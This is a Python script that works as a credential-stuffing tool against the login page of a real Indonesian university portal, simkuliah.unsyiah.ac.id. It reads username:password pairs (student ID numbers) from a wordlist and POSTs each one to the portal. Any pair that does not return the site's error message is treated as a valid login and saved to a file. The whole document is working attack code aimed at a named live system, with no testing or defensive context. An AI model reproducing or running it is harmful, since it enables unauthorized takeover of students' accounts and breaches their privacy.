import requests,os

os.system("clear")

url = "https://simkuliah.unsyiah.ac.id/"
try:
 wlpath = input("\033[1mWordlist path: ")
 svpath = input("\033[1mSave file: ")
 op = open(wlpath,"r")
 wl = op.readlines()
 print ("\033[4mTotal nim: {}\033[0m".format(len(wl)))
except:
 exit()
ses = requests.session()
sukses = 0
fail = 0
count = 0
print ("\033[1;36m>"*30+"\033[0m")
for line in wl:
 try:
  count += 1
  userpw = line.strip().split(":")
  x = {"username":userpw[0],"password":userpw[1]}
  post = ses.post(url,data=x)
  if "Username atau Password Anda salah.." in post.text:
    print (f"\033[1m[{count}] \033[91mLogin Failed \033[0;1m| {line.strip()}\033[0m")
    fail += 1
  else:
    print (f"\033[1m[{count}] \033[92mLogin Succes  \033[0;1m| {line.strip()}\033[0m")
    ses = requests.session()
    sv = open(f"{svpath}.txt","a")
    sv.write(line)
    sv.close
    sukses += 1
 except KeyboardInterrupt:
  break
 except Exception as r:
  exit ("\033[1;41m >>> {} <<< \033[0m".format(r))
op.close()
print ("\r"+"\033[1;36m<"*30+"\033[0m")
print ("\033[1;92mSukses = {}\n\033[91mFailed = {}\n\033[36mSaved to {}.txt\033[0m".format(sukses,fail,svpath))
